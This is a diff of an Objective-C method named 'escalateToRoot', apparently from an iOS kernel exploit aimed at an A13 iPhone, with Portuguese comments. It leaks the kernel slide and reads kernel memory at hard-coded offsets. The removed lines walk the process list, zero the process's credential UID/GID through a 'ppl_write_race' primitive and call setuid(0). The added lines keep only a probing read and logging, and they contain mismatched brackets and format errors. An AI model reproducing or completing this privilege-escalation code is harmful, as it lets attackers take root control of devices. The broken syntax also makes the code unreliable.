@@ -112,46 +112,29 @@ extern char **environ;
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide];
-    uint64_t offsets[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
-    uint64_t proc = 0;
+    uint64_t slide = [self leakKernelSlide]; // 0x21000000 detectado
+    [self logToWeb:[NSString stringWithFormat:@"✅ Slide: %d", slide)];
+    
+    // No iOS 26.3 (A13), tente a base exata de 16KB
+    #define KERN_BASE_A13 0xFFFFFFF007004000ULL 
+    
+    // Tente este offset específico da seção DATA_CONST do iPhone 11
+    uint64_t allproc_ptr = (KERN_BASE_A13 + slide + 0x91F0000ULL);
+    uint64_t proc = [self kread64:allproc_ptr];
 
-    for (int i = 0; i < 4; i++) {
-        uint64_t ptr = (KERN_BASE_STATIC + (slide & 0xFFFFFFFFFFE00000ULL) + 0x8F50000ULL);
-        proc = [self kread64:ptr];
-        
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando 0x%llx -> Proc: 0x%llx", offsets[i], proc]];
+    [self logToWeb:[NSString stringWithFormat:@"🔍 Teste Final: 0x%llx", proc]];
 
-        if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
-            [self logToWeb:@"🎯 LISTA LOCALIZADA!"];
-            break;
-        }
-    }
-
-    if (proc == 0) return NO;
-
-    while (proc != 0) {
-        // PAC Strip para A13
+    // Se o proc começar com 0xFFFFFF..., ele achou o Kernel!
+    if ((proc >> 40) >= 0xFFFFFF) {
+        // Agora sim, desmascare para ver o PID no 0x68
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-        
-        // No A13 (iOS 26.3), o PID está em 0x68
-        uint32_t p68 = [self kread32:(proc + 0x68)];
-        
-        if (p68 == getpid()) {
-            [self logToWeb:@"✅ PID CONFIRMADO NO 0x68!"];
-            
-            // Patch ucred (Offset 0xD8)
-            uint64_t ucred = [self kread64:(proc + 0xD8)];
-            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-            
-            [self ppl_write_race:(ucred + 0x18) value:0]; // UID/GID = 0
-            setuid(0);
-            return (getuid() == 0);
-        }
-        proc = [self kread64:(proc + 0x08)];
+        uint32_t pid = [self kread32:(proc + 0x68)];
+        [self logToWeb:[NSString stringWithFormat:@"✅ PID em 0x68: %d", pid)];
     }
+    
     return NO;
 }
+
 
 
 
